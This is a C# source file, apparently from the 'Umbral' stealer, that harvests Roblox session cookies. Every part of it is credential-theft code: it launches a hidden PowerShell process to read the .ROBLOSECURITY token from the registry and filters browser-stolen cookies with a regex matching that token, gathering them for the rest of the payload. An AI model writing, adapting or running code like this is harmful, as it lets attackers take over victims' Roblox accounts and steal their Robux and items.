using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Umbral.payload.Browsers;

namespace Umbral.payload.Games.Roblox
{
    internal static class RobloxCookieStealer
    {
        static private readonly List<string> RobloxCookies;

        static RobloxCookieStealer()
        {
            RobloxCookies = new List<string>();
        }

        internal static async Task<string[]> GetCookies(params Task<CookieFormat[]>[] getBrowserCookiesTasks)
        {
            Regex regex =
                new Regex(
                    @"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+",
                    RegexOptions.Compiled);

            foreach (string key in new[] { "HKCU", "HKLN" })

                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "powershell.exe";
                    process.StartInfo.Arguments =
                        $"Get-ItemPropertyValue -Path {key}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY";
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.Start();
                    process.WaitForExit();
                    if (process.ExitCode == 0)
                    {
                        MatchCollection matches = regex.Matches(await process.StandardOutput.ReadToEndAsync());
                        foreach (Match match in matches)
                        {
                            string cookie = match.Value;
                            if (!RobloxCookies.Contains(cookie)) RobloxCookies.Add(cookie);
                        }
                    }
                }

            foreach (var getBrowserCookieTask in getBrowserCookiesTasks)
            {
                var browserCookies = await getBrowserCookieTask;
                foreach (string cookie in browserCookies
                             .Where(p => regex.IsMatch(p.Cookie))
                             .Select(p => p.Cookie)
                             .ToArray()
                        )
                    if (!RobloxCookies.Contains(cookie))
                        RobloxCookies.Add(cookie);
            }

            return RobloxCookies.ToArray();
        }
    }
}